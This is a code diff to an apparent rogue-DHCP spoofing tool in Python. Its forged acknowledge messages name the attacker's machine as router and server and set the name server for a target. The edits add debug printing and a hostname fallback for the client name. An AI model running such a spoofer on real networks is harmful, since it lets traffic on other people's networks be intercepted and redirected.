@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 
+from icecream import ic
 import netifaces
 import logging
 import importlib
@@ -134,15 +135,20 @@ class Spoofer(metaclass=Singleton):
         # Change DHCP fields
         req_opts = request[DHCP].options
         comp_name = ''
+        hostname = ''
+        comp_name_res = ''
 
         for x in req_opts:
+            ic(', '.join([str(y) for y in x]))
+            if x[0].lower() == 'hostname':
+                hostname = x[1]
             if x[0].lower() == 'client_fqdn':
                 comp_name = x[1]
                 break
         
-        if comp_name == '':
-            return None
-        
+        comp_name_res = comp_name if comp_name != '' else \
+            hostname if hostname != '' else 'XXXX'
+
         opts = [('message-type', 5),\
                 ('server_id', self.my_ip),\
                 ('lease_time', 43200),\
@@ -153,7 +159,7 @@ class Spoofer(metaclass=Singleton):
                 ('router', self.my_ip),\
                 ('name_server', self.dns_server),\
                 ('domain', b'lan'),\
-                ('client_FQDN', comp_name),\
+                ( ('client_FQDN') if comp_name != '' else ('hostname') , comp_name_res),\
                 'end']
 
         # Write options
@@ -272,9 +278,17 @@ def handle_DHCP_discover(pack):
         
         request = request[0]
 
+        print('REQ')
+        request.show()
+
         # Send acknowledge
         print('=-=-=-=- Sending Acknowledge =-=-=-=-')
         ack = spoof.build_acknowledge_message(request)
+
+
+        print('ACK')
+        ack.show()
+
         sendp(ack)
 
         if spoof.target_mac == '':
